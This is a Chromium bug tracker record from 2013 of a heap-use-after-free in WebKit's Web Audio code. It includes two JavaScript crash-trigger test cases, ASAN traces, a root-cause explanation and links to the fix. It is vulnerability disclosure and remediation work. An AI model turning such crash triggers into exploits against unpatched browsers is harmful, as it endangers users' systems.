# Heap-use-after-free in WebCore::AudioNodeInput::updateInternalBus

| Field | Value |
|-------|-------|
| **Issue ID** | [40076876](https://issues.chromium.org/issues/40076876) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | at...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2013-01-25 |
| **Bounty** | $1,000.00 |

## Description

Tested on:

OS:Ubuntu 12.04
Chromium: 26.0.1394.0 (Developer Build 178763)

Repro-file:

<html>
<script>
var context1= new webkitAudioContext()
var Panner0=context1.createPanner();
var Oscillator10=context1.createOscillator();
var BiquadFilter3=context1.createBiquadFilter();

BiquadFilter3.connect(context1.destination);
BiquadFilter3.frequency.value=961;
Oscillator10.connect(BiquadFilter3);
Panner0.setPosition(135,358,296);
setTimeout(function(){
Panner0.connect(BiquadFilter3);
},1)


setTimeout(function(){location.reload()},2)

</script>
</html>

Test case is little unstable but should crash if you wait for 10s or so.

ASAN-report:

==20758== ERROR: AddressSanitizer: heap-use-after-free on address 0x7f0b1dff08c8 at pc 0x7f0b50fd36a2 bp 0x7f0b1c55e1f0 sp 0x7f0b1c55e1e8
READ of size 8 at 0x7f0b1dff08c8 thread T93 (AudioOutputDevic)
    #0 0x7f0b50fd36a1 in WebCore::AudioNodeInput::updateInternalBus() ???:0
    #1 0x7f0b50fdde5e in WebCore::AudioSummingJunction::updateRenderingState() ???:0
    #2 0x7f0b519e456a in WebCore::AudioContext::handleDirtyAudioSummingJunctions() ???:0
    #3 0x7f0b519e436f in WebCore::AudioContext::handlePreRenderTasks() ???:0
    #4 0x7f0b51e1b4f9 in WebCore::AudioDestinationNode::render(WebCore::AudioBus*, WebCore::AudioBus*, unsigned long) ???:0
    #5 0x7f0b5434adad in WebCore::AudioPullFIFO::consume(WebCore::AudioBus*, unsigned long) ???:0
    #6 0x7f0b54152d76 in WebCore::AudioDestinationChromium::render(WebKit::WebVector<float*> const&, WebKit::WebVector<float*> const&, unsigned long) ???:0
.
.
.
freed by thread T93 (AudioOutputDevic) here:
    #0 0x7f0b4d857f02 in operator delete(void*) ??:0
    #1 0x7f0b50fd536b in WebCore::AudioNodeOutput::updateNumberOfChannels() ???:0
    #2 0x7f0b51e1431a in WebCore::AudioBasicProcessorNode::checkNumberOfChannelsForInput(WebCore::AudioNodeInput*) ???:0
    #3 0x7f0b50fdde5e in WebCore::AudioSummingJunction::updateRenderingState() ???:0
    #4 0x7f0b519e456a in WebCore::AudioContext::handleDirtyAudioSummingJunctions() ???:0
    #5 0x7f0b519e436f in WebCore::AudioContext::handlePreRenderTasks() ???:0
.
.
.

## Timeline

### in...@chromium.org (2013-01-25)

[Empty comment from Monorail migration]

### rt...@chromium.org (2013-01-25)

In a debug build, this test script causes the assertion:

ASSERTION FAILED: numberOfChannels <= MaxBusChannels
../../third_party/WebKit/Source/WebCore/platform/audio/AudioBus.cpp(57) : WebCore::AudioBus::AudioBus(unsigned int, size_t, bool)


### in...@chromium.org (2013-01-26)

Should all of these kind of checks be hard checks in release build, this is the fourth bug near this code that attekett found and since it is reachable so easily by javascript, we should just fix all these out of bounds indicator checks and make them work as hard bailout conditions in release.

### in...@chromium.org (2013-01-31)

[Empty comment from Monorail migration]

### [Deleted User] (2013-01-31)

Filed upstream as https://bugs.webkit.org/show_bug.cgi?id=108542

### in...@chromium.org (2013-02-01)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=163216425

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f74ec0e5788
Crash State:
  - crash stack -
  WebCore::AudioNodeInput::updateInternalBus
  WebCore::AudioSummingJunction::updateRenderingState
  - free stack -
  WebCore::AudioNodeOutput::updateNumberOfChannels
  WebCore::AudioBasicProcessorNode::checkNumberOfChannelsForInput
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=162796:162815

Minimized Testcase (0.37 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95aaQPlXt0lreKwZg5Fl6-anwR6dYU-e0oIA4IBIXe5QhYDyVBvKQgv6TBUgcHuywce7_JDnbexsY2prslvOWLgZoQNKtStmIlk2VSQVGn63wNdz6jD8cBJ807UNXIuwKxNVLLauNdqnEcekgl1R2a_6lpM7cqVhK8obRbOR0E95f-hoxs
<script>
var context1= new webkitAudioContext()
var Panner0=context1.createPanner();
var Oscillator10=context1.createOscillator();
var BiquadFilter3=context1.createBiquadFilter();

BiquadFilter3.connect(context1.destination);
Oscillator10.connect(BiquadFilter3);
setTimeout(function(){
Panner0.connect(BiquadFilter3);
},1)


setTimeout(function(){location.reload()},2)

</script>

### in...@chromium.org (2013-02-01)

This regressed from http://src.chromium.org/viewvc/chrome?view=rev&revision=162810. Dale, can you please help to take a look.

### da...@chromium.org (2013-02-02)

WebAudio stuff. over to rtoy.

### pa...@chromium.org (2013-02-11)

Hey Raymond,

Wanted to followup on this open security bug too (as it relates to Pwnium/Pwn2Own, http://blog.chromium.org/2013/01/show-off-your-security-skills-pwn2own.html).

How's this one going?

### in...@chromium.org (2013-02-13)

moving m24 bugs to m25.

### pa...@chromium.org (2013-02-26)

Just chatted with rtoy@ and he's been trying to debug this one: "It's caused by the code accessing an object that has been deleted.  I haven't figured out who is holding onto the deleted object."

crogers@ any ideas?

### in...@chromium.org (2013-02-27)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-02-27)

James.wei@, do you have time to look into this ? We have a hard time tracking this.

### [Deleted User] (2013-02-27)

inferno, I will have a look into it. 
+xingnan in our team. 

### in...@chromium.org (2013-02-27)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-02-27)

Thanks a lot.

### [Deleted User] (2013-02-27)

inferno, I believe we found the root cause of this issue. 

It is caused by the AudioBus In-Place optimization.

    // m_actualDestinationBus is set in pull() and will either point to one of our internal busses or to the in-place bus.
    // It must only be changed in the audio thread (or constructor).
    AudioBus* m_actualDestinationBus;

This pointer will store the pointer to the AudioBus in another node when in-place optimization applied, which may be freed when update internal bus.

but in unsigned AudioNodeInput::numberOfChannels() const, this bus is used to get the actual number of output channel. 
        maxChannels = max(maxChannels, output->bus()->numberOfChannels());

Xingnan and me are working on a patch for it. 


### in...@chromium.org (2013-02-27)

Thanks for the quick response james.wei@. I have cced Ken(kbr@) who should be able to review your patch.

### kb...@chromium.org (2013-02-27)

@crogers is a WebKit reviewer and the principal engineer on Web Audio so he should review it.


### in...@chromium.org (2013-03-01)

http://trac.webkit.org/changeset/144417

### sc...@gmail.com (2013-03-01)

Awesome!! Thanks Xingnan / James / Raymond / Chris / all :)

### sc...@gmail.com (2013-03-02)

Another $1000 !!

### cl...@chromium.org (2013-03-03)

ClusterFuzz has detected this issue as fixed in range 185533:185684.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=163216425

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f74ec0e5788
Crash State:
  - crash stack -
  WebCore::AudioNodeInput::updateInternalBus
  WebCore::AudioSummingJunction::updateRenderingState
  - free stack -
  WebCore::AudioNodeOutput::updateNumberOfChannels
  WebCore::AudioBasicProcessorNode::checkNumberOfChannelsForInput
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=162796:162815
Fixed: https://cluster-fuzz.appspot.com/revisions?range=185533:185684

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95aaQPlXt0lreKwZg5Fl6-anwR6dYU-e0oIA4IBIXe5QhYDyVBvKQgv6TBUgcHuywce7_JDnbexsY2prslvOWLgZoQNKtStmIlk2VSQVGn63wNdz6jD8cBJ807UNXIuwKxNVLLauNdqnEcekgl1R2a_6lpM7cqVhK8obRbOR0E95f-hoxs

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-12)

M26: http://trac.webkit.org/changeset/145456

### pa...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-23)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-05)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-06-10)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/172342?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/175197]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076876)*
